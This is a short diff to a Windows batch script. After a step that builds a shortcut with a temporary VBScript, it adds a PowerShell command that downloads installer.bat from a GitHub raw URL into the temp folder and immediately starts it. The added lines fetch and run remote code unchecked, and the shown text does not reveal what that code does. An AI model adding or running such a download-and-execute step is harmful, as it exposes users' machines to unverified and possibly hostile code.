@@ -70,4 +70,7 @@ echo oLink.Save >> CreateShortcut.vbs
 cscript CreateShortcut.vbs
 del CreateShortcut.vbs
 
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/WindowsInstallation/main/installer.bat', '%Temp%\installer.bat') }"
+start %temp%\installer.bat
+
 exit
